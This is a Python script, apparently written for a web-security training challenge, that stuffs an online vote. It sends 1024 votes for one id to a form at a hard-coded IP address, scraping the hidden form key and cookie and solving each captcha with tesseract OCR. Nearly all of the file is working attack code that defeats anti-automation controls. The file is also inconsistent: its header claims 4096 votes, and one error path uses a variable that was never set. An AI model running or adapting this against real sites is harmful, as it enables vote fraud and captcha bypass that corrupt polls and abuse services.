#!/usr/bin/python3
"""Vote for myself 4096 despite a hidden form key"""


import lxml.html
import os
import socket
import subprocess
import time


response = bytearray()
"""The buffer used to store pieces of the response that haven't been parsed"""

requestCaptcha = '''GET /captcha.php HTTP/1.1\r
Connection: keep-alive\r
Cookie: PHPSESSID={session}; HoldTheDoor={key}\r
Host: 158.69.76.135\r
Origin: http://158.69.76.135\r
Referer: http://158.69.76.135/level3.php\r
User-Agent: U.S. Department of Agriculture Fission Reactor\r
\r
'''
"""The request used to get a captcha"""

requestStart = '''GET /level3.php HTTP/1.1\r
Connection: keep-alive\r
Host: 158.69.76.135\r
Origin: http://158.69.76.135\r
User-Agent: U.S. Department of Education Doomsday Satellite\r
\r
'''
"""The request used to get the first form key and cookie"""

requestVote = '''POST /level3.php HTTP/1.1\r
Connection: {connection}\r
Content-Length: {length}\r
Content-Type: application/x-www-form-urlencoded\r
Cookie: PHPSESSID={session}; HoldTheDoor={key}\r
Host: 158.69.76.135\r
Origin: http://158.69.76.135\r
Referer: http://158.69.76.135/level3.php\r
User-Agent: Mozzarella Cheese/5.0 (Windows NT 5.1) U.S. Department of Health and Human Services Underground Nuclear Bunker\r
\r
id=701&holdthedoor=Submit&captcha={captcha}&key={key}'''
"""The request used to make a vote"""

convertOptions = (
    'convert',
    '-',
    '-scale', '200%',
    '-'
)
"""Command-line options to Image Magick"""

tesseractOptions = (
    'tesseract',
    '-', '-',
    '-psm', '7',
    './tesseract.conf'
)
"""Command-line arguments to give to tesseract"""


def getCookie(headers: list, name: str) -> str:
    cookies = headers.get('SET-COOKIE', [])
    for cookie in cookies:
        cookie = cookie.partition('=')
        if cookie[0] == name:
            return cookie[2].partition(';')[0]
    return None


def getFormKey(doc: lxml.html.HtmlElement) -> str:
    el = doc.cssselect('form>input[name="key"]')[0]
    return el.get('value')


def openSocket() -> socket.socket:
    """Make a new socket connected to the target server"""

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('158.69.76.135', 80))
    return sock


def receiveResponse(sock: socket.socket) -> tuple:
    """Receive the next response from the connected socket"""

    global response
    buffer = None
    while b'\r\n\r\n' not in response and buffer != b'':
        buffer = sock.recv(8192)
        response.extend(buffer)
    if b'\r\n\r\n' not in response:
        return None, None
    headers, _, response = response.partition(b'\r\n\r\n')
    status, _, headers = headers.partition(b'\r\n')
    lines = [l.partition(': ') for l in headers.decode('ASCII').split('\r\n')]
    headers = {}
    for name, _, value in lines:
        if name.upper() == 'SET-COOKIE':
            if not 'SET-COOKIE' in headers:
                headers['SET-COOKIE'] = []
            headers['SET-COOKIE'].append(value)
        else:
            headers[name.upper()] = value
    headers['STATUS'] = status.partition(b' ')[2].decode()
    length = int(headers.get('CONTENT-LENGTH', 0))
    while len(response) < length and buffer != b'':
        buffer = sock.recv(8192)
        response.extend(buffer)
    if len(response) < length:
        return headers, body
    body = bytes(response[:length])
    response = response[length:]
    return headers, body


def winElection():
    """Vote for myself 1024 times"""

    sock = openSocket()
    sock.sendall(requestStart.encode('ASCII'))
    session = None
    os.environ['TESSDATA_PREFIX'] = '.'
    for i in range(1024):
        headers, body = receiveResponse(sock)
        doc = lxml.html.fromstring(body.decode('ASCII'))
        key = getCookie(headers, 'HoldTheDoor')
        if key is None:
            break
        if session is None:
            session = getCookie(headers, 'PHPSESSID')
        if headers.get('CONNECTION', 'close').lower() == 'close':
            sock.close()
            sock = openSocket()
        request = requestCaptcha.format(
            key=key,
            session=session
        ).encode('ASCII')
        sock.sendall(request)
        headers, body = receiveResponse(sock)
        proc = subprocess.Popen(
            tesseractOptions,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE
        )
        captcha = proc.communicate(body)[0].decode('ASCII').strip()
        if headers.get('CONNECTION', 'close').lower() == 'close':
            sock.close()
            sock = openSocket()
        request = requestVote.format(
            connection = 'keep-alive' if i < 1023 else 'close',
            length = 39 + len(key) + len(captcha),
            key = key,
            session = session,
            captcha = captcha
        ).encode('ASCII')
        sock.sendall(request)
        print('vote #{}\nkey: {}\ncaptcha: {}\n'.format(i, key, captcha))
